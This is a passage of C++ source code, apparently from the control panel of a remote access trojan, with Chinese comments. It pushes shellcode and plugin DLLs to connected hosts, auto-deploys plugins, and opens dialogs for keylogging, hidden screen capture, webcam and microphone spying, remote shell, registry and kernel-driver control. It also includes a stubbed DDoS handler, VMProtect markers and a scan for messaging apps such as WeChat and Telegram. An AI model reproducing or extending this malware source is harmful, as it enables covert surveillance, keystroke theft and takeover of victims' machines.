	{
	case TOKEN_CONDITION: //更新窗口数据
	{

		if (!pContext->m_bIsMainSocket) return;
		if (pContext->Item_cmp_old_IsActive && pContext->Item_cmp_old_winodow)
		{
			DATAUPDATE* pDATAUPDATE = (DATAUPDATE*)pContext->m_DeCompressionBuffer.GetBuffer();
			pContext->Item_cmp_old_IsActive->SetCaption(pDATAUPDATE->UserActive);
			pContext->Item_cmp_old_winodow->SetCaption(pDATAUPDATE->Window);
			if (pContext->LoginInfo) memcpy(pContext->LoginInfo->Window, pDATAUPDATE->Window, 502);
			int PictureSize = pContext->m_DeCompressionBuffer.GetBufferLen() - sizeof(DATAUPDATE);
		
			if ((PictureSize == 0)|| (PictureSize > 61440))
				return;

			bbusy = false;
			pContext->PictureSize = PictureSize;
			SAFE_DELETE_AR(pContext->ScreenPicture);
			pContext->ScreenPicture = new byte[pContext->PictureSize];
			pContext->iScreenWidth = pDATAUPDATE->iScreenWidth;
			pContext->iScreenHeight = pDATAUPDATE->iScreenHeight;
			memcpy(pContext->ScreenPicture, pContext->m_DeCompressionBuffer.GetBuffer() + sizeof(DATAUPDATE), pContext->PictureSize);

		}
		if ((CQuickView*)pContext->pView != NULL)
		((CQuickView*)pContext->pView)->wndReport->RedrawControl();
	}
	break;
	case TOKEN_GETAUTODLL:
		SendAutoDll(pContext);
		break;
	case TOKEN_PROCESS: //更新进程
	{
		if (!pContext->m_bIsMainSocket) return;
		if (pContext->Item_cmp_old_winodow)
			pContext->Item_cmp_old_winodow->SetBackgroundColor(RGB(7, 254, 254));
	}
	break;
	case TOKEN_LOGIN: // 上线包
	{
		switch (pContext->switchsocket)   //暂停上线控制  //如果恢复需要重启才可以上线
		{
		case tcp:
		{
			CHpTcpServer* t_CIOCPServer = (CHpTcpServer*)pContext->m_server;
			if (t_CIOCPServer->m_stop == 1) return;
		}
		break;
		case udp:
		{
			CHpUdpServer* t_CHpUdpServer = (CHpUdpServer*)pContext->m_server;
			if (t_CHpUdpServer->m_stop == 1) return;
		}
		break;
		default:
			break;
		}
		g_pTabView->SendMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
	}
	break;
	case TOKEN_GNDESKTOP:	//显示截图
		OnOpenDesktop(pContext);
		break;
	case TOKEN_GETVERSION:	//获取版本
		OnOpenSendVersion(pContext);
		break;
	case TOKEN_SENDLL:	//发送插件
		OnOpenSendDll(pContext);
		break;
	case TOKEN_ERROR:
	{
		if (pContext && pContext->m_bIsMainSocket)
		{
			if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(SendErrorDate))
				return;
			SendErrorDate* m_SendErrorDate = new SendErrorDate;
			memcpy(m_SendErrorDate, pContext->m_DeCompressionBuffer.GetBuffer(), sizeof(SendErrorDate));
			if (pContext->Item_cmp_old_m_Time)
			{
				CString old_str = pContext->Item_cmp_old_m_Time->GetCaption();
				if (old_str.GetAllocLength() > 150)
					old_str.Delete(75, 75);
				old_str.Insert(0, m_SendErrorDate->ErrorDate);
				pContext->Item_cmp_old_m_Time->SetCaption(old_str);
			}
			SAFE_DELETE(m_SendErrorDate);
		
		}
		if ((CQuickView*)pContext->pView!=NULL)
		((CQuickView*)pContext->pView)->wndReport->RedrawControl();
	}
	break;

	case TOKEN_DRIVE_LIST: // 驱动器列表
		g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO_DIF: //差异屏幕
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG_DIF, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO_QUICK: //高速屏幕
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG_QUICK, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO_PLAY: //娱乐屏幕
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG_PLAY, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO_HIDE: //后台屏幕
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG_HIDE, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pFrame->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: //麦克风
		g_pFrame->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SPEAK_START: // 扬声器
		g_pFrame->PostMessage(WM_OPENSPEAKERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START://键盘
		g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START://远程终端
		g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SYSINFOLIST://系统管理
		g_pFrame->PostMessage(WM_OPENSYSINFODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_CHAT_START://远程交谈
		g_pFrame->PostMessage(WM_OPENCHATDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:		//注册表管理    
		g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PROXY_START:		//代理
		g_pFrame->PostMessage(WM_OPENPROXYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KERNEL:	//驱动插件
		g_pFrame->PostMessage(WM_OPENPKERNELDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_EXPAND:	//互动插件
		g_pFrame->PostMessage(WM_OPENPEXPANDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DDOS:	//压力测试
		//p_CDDOSAttackDlg->PostMessage(WM_DDOS_CLIENT, 0, (LPARAM)pContext);
		break;
	case TOKEN_MONITOR:	//屏幕监控
		g_pScreenMonitorDlg->PostMessage(WM_MONITOR_CLIENT, 0, (LPARAM)pContext);
		break;
	default:
		TRACE("switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0]) 非法数据");
		break;
	}
	return;
}

// 需要显示进度的窗口
void CMainFrame::ProcessReceive(ClientContext* pContext)
{
	if ((pContext == NULL))
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog* dlg = (CDialog*)pContext->m_Dialog[1];

	//交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{



		case FILEMANAGER_DLG: // 文件管理
			((CFileManagerDlg*)dlg)->OnReceive();
			break;
		case SCREENSPY_DIF_DLG: //差异屏幕
			((CDifScreenSpyDlg*)dlg)->OnReceive();
			break;
		case SCREENSPY_QUICK_DLG: //高速屏幕
			((CQuickScreenSpyDlg*)dlg)->OnReceive();
			break;
		case SCREENSPY_PLAY_DLG: //娱乐屏幕
			((H264CScreenSpyDlg*)dlg)->OnReceive();
			break;
		case SCREENSPY_HIDE_DLG: //后台屏幕
			((CHideScreenSpyDlg*)dlg)->OnReceive();
			break;
		case WEBCAM_DLG: // 摄像头
			((CWebCamDlg*)dlg)->OnReceive();
			break;
		case AUDIO_DLG:				//麦克风
			((CAudioDlg*)dlg)->OnReceive();
			break;
		case SPEAKER_DLG:			//扬声器 
			((CSpeakerDlg*)dlg)->OnReceive();
			break;
		case CHAT_DLG:				//对话
			((CChat*)dlg)->OnReceive();
			break;
		case SHELL_DLG:				//终端
			((CShellDlg*)dlg)->OnReceive();
			break;
		case PROXY_DLG:				//代理
			((CProxyMapDlg*)dlg)->OnReceive();
			break;
		case KEYBOARD_DLG:			//键盘	
			((CKeyBoardDlg*)dlg)->OnReceive();
			break;
		case REGEDIT_DLG:			//注册表
			((CRegeditDlg*)dlg)->OnReceive();
			break;
		case MACHINE_DLG:			//系统管理
			((CMachineDlg*)dlg)->OnReceive();
			break;
		case KERNEL_DLG:			//驱动插件
			((CKernelDlg*)dlg)->OnReceive();
			break;
		case EXPAND_DLG:			//互动插件窗口
			((CExpandDlg*)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}


void CMainFrame::ProcessSendShellcode(ClientContext* pContext, int i)
{
	OUT_PUT_FUNCION_NAME_INFO
		BYTE* bPacket = new BYTE[512 * 1024];
	memset(bPacket, 0, 300 * 1024);
	if (i == 0)
	{
		memcpy(bPacket, Shellcode32, ShellcodeSize32);
	}
	else
	{
		memcpy(bPacket, Shellcode64, ShellcodeSize64);
	}
	g_pSocketBase->Send(pContext, bPacket, 300 * 1024);
	SAFE_DELETE_AR(bPacket);

	return;
}

void CMainFrame::FindBestPosition(CXTPPopupControl* pPopup, CSize szPopup)
{
	OUT_PUT_FUNCION_NAME_INFO
		if (m_ptPopup != CPoint(-1, -1))
			pPopup->SetPopupPos(m_ptPopup);

	CPoint ptPopup = pPopup->GetPopupPos();

	CRect rcActivePopup(CPoint(ptPopup.x - szPopup.cx, ptPopup.y - szPopup.cy), szPopup);


	BOOL bIntersect = FALSE;
	do
	{
		bIntersect = FALSE;
		POSITION pos = m_lstPopupControl.GetHeadPosition();

		while (pos)
		{
			CXTPPopupControl* pPopup = m_lstPopupControl.GetNext(pos);
			if (pPopup)
			{
				CRect rcPopup(CPoint(pPopup->GetPopupPos().x - pPopup->GetPopupSize().cx,
					pPopup->GetPopupPos().y - pPopup->GetPopupSize().cy), pPopup->GetPopupSize());

				if (CRect().IntersectRect(rcPopup, rcActivePopup))
				{
					ptPopup.y = rcPopup.top;
					rcActivePopup = CRect(CPoint(ptPopup.x - szPopup.cx, ptPopup.y - szPopup.cy), szPopup);
					bIntersect = TRUE;
				}
			}
		}
	} while (bIntersect);

	pPopup->SetPopupPos(ptPopup);

}


LRESULT CMainFrame::OnOpenDestopPopup(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		CString* p_str_path = (CString*)lParam;
	CXTPPopupControl* pPopup = new CXTPPopupControl();
	pPopup->SetTransparency(255);  //透明度
	pPopup->AllowMove(TRUE);	//移动
	pPopup->SetAnimateDelay(100);//动画延迟
	pPopup->SetPopupAnimation(xtpPopupAnimationFade);		//弹出方式
	pPopup->SetShowDelay(1500);	//显示时间
	UINT nCommands[] = { 100 };
	int ImageWidth = GetSystemMetrics(SM_CXSCREEN) / 8;
	int ImageHigth = GetSystemMetrics(SM_CYSCREEN) / 8;


	// 添加标题图标。
	CXTPPopupItem* pItemIcon = (CXTPPopupItem*)pPopup->AddItem(new CXTPPopupItem(XTP_DPI(CRect(7, 3, 20, 19))));
	pItemIcon->SetIcons(IDR_MAINFRAME, 0, xtpPopupItemIconNormal);
	pItemIcon->SetButton(FALSE);

	// 添加标题文字。
	CXTPPopupItem* pItemText = (CXTPPopupItem*)pPopup->AddItem(new CXTPPopupItem(CRect(XTP_DPI_X(25), XTP_DPI_Y(3), m_sizePopup.cx - XTP_DPI_X(25), XTP_DPI_Y(19)), p_str_path->GetBuffer()));
	pItemText->SetTextAlignment(DT_LEFT);
	pItemText->CalculateHeight();
	pItemText->CalculateWidth();
	pItemText->SetHyperLink(FALSE);
	pItemText->SetTextColor(RGB(255, 0, 0));
	pItemText->SetID(-2);
	m_sizePopup = XTP_DPI(CSize(ImageWidth, ImageHigth + 19));

	HBITMAP bitmap = (HBITMAP)LoadImage(AfxGetInstanceHandle(), p_str_path->GetBuffer(), IMAGE_BITMAP, ImageWidth, ImageHigth, LR_LOADFROMFILE);
	if (!bitmap) return TRUE;
	pItemIcon = (CXTPPopupItem*)pPopup->AddItem(new CXTPPopupItem(CRect(0, XTP_DPI_Y(20), m_sizePopup.cx, m_sizePopup.cy)));
	pItemIcon->SetIcons(bitmap, 255, xtpPopupItemIconNormal);
	pItemIcon->SetID(-2);
	pItemIcon->SetCaption(p_str_path->GetBuffer());

	pPopup->SetTheme(xtpPopupThemeMSN);
	pPopup->SetPopupSize(m_sizePopup);
	FindBestPosition(pPopup, m_sizePopup);
	pPopup->Show(this);
	//	SAFE_DELETE(pPopup);
	m_lstPopupControl.AddTail(pPopup);
	SAFE_DELETE(p_str_path);

	return TRUE;

}



LRESULT CMainFrame::OnPopUpNotify(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		if (wParam == XTP_PCN_ITEMCLICK)
		{
			CXTPPopupItem* pItem = (CXTPPopupItem*)lParam;
			ASSERT(pItem);

			switch (pItem->GetID())
			{
			case -2:
				::ShellExecute(NULL, _T("open"), pItem->GetCaption(), NULL, NULL, SW_SHOW);
				//pItem->GetPopupControl()->Close();

			}
		}
		else if (wParam == XTP_PCN_STATECHANGED)
		{
			CXTPPopupControl* pControl = (CXTPPopupControl*)lParam;
			ASSERT(pControl);

			switch (pControl->GetPopupState())
			{
			case xtpPopupStateClosed:
			{
				POSITION pos = m_lstPopupControl.Find(pControl);
				if (pos)
				{
					m_lstPopupControl.RemoveAt(pos);
					delete pControl;
				}
			}
			break;
			}
		}
		else if (wParam == XTP_PCN_POSCHANGED)
		{
			CXTPPopupControl* pControl = (CXTPPopupControl*)lParam;
			ASSERT(pControl);

			m_ptPopup = pControl->GetPopupPos();
		}

	return TRUE;
}


// 更新在线主机数
void CMainFrame::ShowConnects()
{
	VMPSTAR
	CString str;
	int a = 0;
	CQuickView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{
		pView = DYNAMIC_DOWNCAST(CQuickView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->wndReport->GetRecords()->GetCount();
	}

	str.Format(_T("在线:%d"), a);
	m_wndStatusBar.SetPaneText(10000, str);
	
	/*if (a > ONLINE_NUM)
	{
		g_pSocketBase->Shutdown();
	}*/
	VMPEND
		return;
}



//显示截图窗口
void CMainFrame::OnOpenDesktop(ClientContext* pContext)
{
	OUT_PUT_FUNCION_NAME_INFO
		struct tm t;   //tm结构指针
	time_t now;  //声明time_t类型变量
	time(&now);      //获取系统日期和时间
	localtime_s(&t, &now);   //获取当地日期和时间
	TCHAR szPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, szPath, MAX_PATH);
	(_tcsrchr(szPath, _T('\\')))[1] = 0;//删除文件名，只获得路径 字串
	CString strPath;
	for (int n = 0; szPath[n]; n++)
	{
		if (szPath[n] != _T('\\'))
			strPath += szPath[n];
		else
			strPath += _T("\\\\");
	}
	strPath = szPath;
	strPath.Append(_T("screenshot"));
	CreateDirectory(strPath.GetBuffer(), NULL);//新建文件夹
	CString Ttime;
	Ttime.Format(_T("%s\\%s-%d-%d-%d-%d-%d-%d.bmp"), strPath.GetBuffer(), pContext->szAddress, t.tm_mon + 1, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec, pContext->m_Socket);
	HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
	void* pData = GlobalLock(hGlobal);
	memcpy(pData, pContext->m_DeCompressionBuffer.GetBuffer(1), pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
	GlobalUnlock(hGlobal);
	IStream* pStream = NULL;
	if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK)
	{
		CImage image;
		if (SUCCEEDED(image.Load(pStream)))
		{
			IStream* pOutStream = NULL;
			if (CreateStreamOnHGlobal(NULL, TRUE, &pOutStream) == S_OK)
			{
				image.Save(Ttime);
			}
		}
		pStream->Release();
	}
	GlobalFree(hGlobal);
	CString* p_str_path = new CString(Ttime);
	g_pFrame->PostMessage(WM_DESKTOPPOPUP, 0, (LPARAM)p_str_path);
	log_信息(p_str_path);
	return;
}

//发送版本
void CMainFrame::OnOpenSendVersion(ClientContext* pContext)
{
	PluginsDate* p_PluginsDate;
	if (pContext->m_DeCompressionBuffer.GetBuffer(0)[1] == 0)
		p_PluginsDate = &(m_PluginsDate_x86);
	else
		p_PluginsDate = &(m_PluginsDate_x64);

	PluginsDate::iterator it_PluginsDate = p_PluginsDate->find(_T("登录模块.dll_bin"));
	if (it_PluginsDate != p_PluginsDate->end())
	{

		BYTE* bPacket = new BYTE[101];
		memset(bPacket, 0, 101);
		bPacket[0] = TOKEN_GETVERSION;
		memcpy(bPacket + 1, it_PluginsDate->second->Version, 100);
		g_pSocketBase->Send(pContext, bPacket, 101);
		SAFE_DELETE_AR(bPacket);


	}
	log_信息("询问登录模块版本");
}


//发送插件窗口
void CMainFrame::OnOpenSendDll(ClientContext* pContext)
{
	OUT_PUT_FUNCION_NAME_INFO
		DllSendDate* temp = (DllSendDate*)pContext->m_DeCompressionBuffer.GetBuffer(1);
	int i_DllSendDate = sizeof(DllSendDate);
	if (pContext->m_DeCompressionBuffer.GetBufferLen() != (i_DllSendDate + 1))
	{
		log_信息("OnOpenSendDll  TOKEN_SENDL 版本不同 ");
		return;
	}
	CString FileName;
	FileName = temp->DllName; //重传时也发送了一个文件名

	switch (temp->sendtask)
	{
	case TASK_MAIN:
	{
		PluginsDate* p_PluginsDate;
		if (temp->is_64)
			p_PluginsDate = &(m_PluginsDate_x64);
		else
			p_PluginsDate = &(m_PluginsDate_x86);
		PluginsDate::iterator it_PluginsDate = p_PluginsDate->find(FileName);
		if (it_PluginsDate != p_PluginsDate->end())
		{
			int nPacketSize = 1 + i_DllSendDate + it_PluginsDate->second->filesize;
			BYTE* bPacket = new BYTE[nPacketSize];
			memset(bPacket, 0, nPacketSize);
			bPacket[0] = COMMAND_SENDLL;
			temp->DateSize = it_PluginsDate->second->filesize;
			memcpy(temp->szVersion, it_PluginsDate->second->Version, 100);
			memcpy(bPacket + 1, temp, i_DllSendDate);
			memcpy(bPacket + 1 + i_DllSendDate, it_PluginsDate->second->filedate, it_PluginsDate->second->filesize);
			g_pSocketBase->Send(pContext, bPacket, nPacketSize);
			SAFE_DELETE_AR(bPacket);
			log_信息(FileName);

		}
		log_信息("无插件");
		log_信息(FileName);

	}
	break;
	case TASK_PLUG:
	{
		PluginsDate* p_PluginsDate;
		if (temp->is_64)
			p_PluginsDate = &(g_pCPlugView->m_PlugsDatex64);
		else
			p_PluginsDate = &(g_pCPlugView->m_PlugsDatex86);
		PluginsDate::iterator it_PluginsDate = p_PluginsDate->find(FileName);
		if (it_PluginsDate != p_PluginsDate->end())
		{
			int nPacketSize = 1 + i_DllSendDate + it_PluginsDate->second->filesize;
			BYTE* bPacket = new BYTE[nPacketSize];
			memset(bPacket, 0, nPacketSize);
			bPacket[0] = COMMAND_SENDLL;
			temp->DateSize = it_PluginsDate->second->filesize;
			memcpy(temp->szVersion, it_PluginsDate->second->Version, 100);
			memcpy(bPacket + 1, temp, i_DllSendDate);
			memcpy(bPacket + 1 + i_DllSendDate, it_PluginsDate->second->filedate, it_PluginsDate->second->filesize);
			g_pSocketBase->Send(pContext, bPacket, nPacketSize);
			SAFE_DELETE_AR(bPacket);
			log_信息(FileName);

		}
		log_信息("无扩展插件");
		log_信息(FileName);

	}
	break;
	default:
		break;
	}
	return;
}

void CMainFrame::SendAutoDll(ClientContext* pContext)
{
	OUT_PUT_FUNCION_NAME_INFO
		int m_FileSzie = 0;
	int	nPacketLength = 0;
	LPBYTE	lpPacket = NULL;
	TKYLockRW_CLockR r(g_pCPlugView->mLockRM);
	if (pContext)
	{
		PluginsDate::iterator 	iter;
		for (iter = g_pCPlugView->m_PlugsDatex86.begin(); iter != g_pCPlugView->m_PlugsDatex86.end(); iter++) {
			if (iter->second->bauto)
			{
				CString strDllName = iter->first;
				int	nPacketLength = 1 + sizeof(DllSendDate);
				LPBYTE	lpPacket = new BYTE[nPacketLength];
				memset(lpPacket, 0, nPacketLength);
				lpPacket[0] = COMMAND_DLLMAIN;
				DllSendDate DllDate;
				ZeroMemory(&DllDate, sizeof(DllSendDate));
				DllDate.sendtask = TASK_PLUG;
				g_pFrame->GetPluginVersion(strDllName.GetBuffer(), DllDate.szVersion, TASK_PLUG, pContext-> bisx86);
				_tcscpy_s(DllDate.DllName, strDllName.GetBuffer());
				::memcpy(lpPacket + 1, &DllDate, sizeof(DllSendDate));
				g_pSocketBase->Send(pContext, lpPacket, nPacketLength);
				delete[] lpPacket;
			}
		}
	}
	g_pCPlugView->mLockRM.UnlockRead();
}
//////////////////////////////////////功能创建

//shell窗口
LRESULT CMainFrame::OnOpenshelldialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CShellDlg* dlg = new CShellDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

//键盘记录
LRESULT CMainFrame::OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CKeyBoardDlg* dlg = new CKeyBoardDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


//远程交谈
LRESULT CMainFrame::OnOpenchatdialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CChat* dlg = new CChat(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = CHAT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_CHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

//麦克风
LRESULT CMainFrame::OnOpenaudiodialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CAudioDlg* dlg = new CAudioDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

//文件管理
LRESULT CMainFrame::OnOpenmanagerdialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CFileManagerDlg* dlg = new CFileManagerDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

//注册表
LRESULT CMainFrame::OnOpenregeditdialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CRegeditDlg* dlg = new CRegeditDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_REGEDIT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

//代理
LRESULT CMainFrame::OnOpenproxydialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CProxyMapDlg* dlg = new CProxyMapDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = PROXY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_PROXY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


//摄像头
afx_msg LRESULT CMainFrame::OnOpenwebcamdialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CWebCamDlg* dlg = new CWebCamDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_VEDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


//扬声器
afx_msg LRESULT CMainFrame::OnOpenspeakerdialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		//判断系统是否能不能使用这个插件功能-旧系统不支持的函数
		typedef BOOL(WINAPI* AvRevertMmThreadCharacteristicsT)(
			HANDLE AvrtHandle
			);
	char nBhku[] = { 'A','v','R','e','v','e','r','t','M','m','T','h','r','e','a','d','C','h','a','r','a','c','t','e','r','i','s','t','i','c','s','\0' };
	AvRevertMmThreadCharacteristicsT pAvRevertMmThreadCharacteristics = (AvRevertMmThreadCharacteristicsT)GetProcAddress(LoadLibrary(_T("avrt.dll")), nBhku);
	if (pAvRevertMmThreadCharacteristics == NULL)
	{
		MessageBox(_T("控制端在旧系统不支持扬声器监听功能"), _T("注意"));
	}

	ClientContext* pContext = (ClientContext*)lParam;
	CSpeakerDlg* dlg = new CSpeakerDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = SPEAKER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_SPEAKER, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


//主机管理
afx_msg LRESULT CMainFrame::OnOpensysinfodialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CMachineDlg* dlg = new CMachineDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = MACHINE_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_MACHINE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


//驱动插件
afx_msg LRESULT CMainFrame::OnOpenkerneldialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CKernelDlg* dlg = new CKernelDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = KERNEL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_KERNEL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

//互动插件
afx_msg LRESULT CMainFrame::OnOpenexpanddialog(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CExpandDlg* dlg = new CExpandDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = EXPAND_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_EXPAND, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


//差异屏幕
afx_msg LRESULT CMainFrame::OnOpencreenspydialog_dif(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CDifScreenSpyDlg* dlg = new CDifScreenSpyDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = SCREENSPY_DIF_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_SCREEN, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

//高速屏幕
afx_msg LRESULT CMainFrame::OnOpencreenspydialog_quick(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	CQuickScreenSpyDlg* dlg = new CQuickScreenSpyDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = SCREENSPY_QUICK_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_SCREEN, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}

//娱乐屏幕
afx_msg LRESULT CMainFrame::OnOpencreenspydialog_play(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	H264CScreenSpyDlg* dlg = new H264CScreenSpyDlg(this, g_pSocketBase, pContext);
	pContext->m_Dialog[0] = SCREENSPY_PLAY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	return 0;
}


typedef struct {
    TCHAR processName[20];
    char softwareName[20];
} SocialSoftware;

SocialSoftware socialSoftwares[] = {
    {_T("WeChat.exe"), "微信"},
    {_T("QQ.exe"), "QQ"},
    {_T("Telegram.exe"), "Telegram(飞机)"},
    {_T("Discord.exe"), "Discord"},
    {_T("WhatsApp.exe"), "WhatsApp"},
    {_T("Skype.exe"), "Skype"}
};

const char* findSocialSoftwareName(const TCHAR* processName) {
    int i = 0;
    while (_tcscmp(socialSoftwares[i].processName, _T("")) != 0) {
        if (_tcscmp(processName, socialSoftwares[i].processName) == 0) {
            return socialSoftwares[i].softwareName;
        }
        i++;
    }
    return NULL;
}

void checkSocialProcesses() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return;
    }

    do {
        const char* softwareName = findSocialSoftwareName(pe32.szExeFile);
        if (softwareName != NULL) {
            char processName[256];
            WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, processName, 256, NULL, NULL);
   
        }
    } while (Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);
}

//后台屏幕
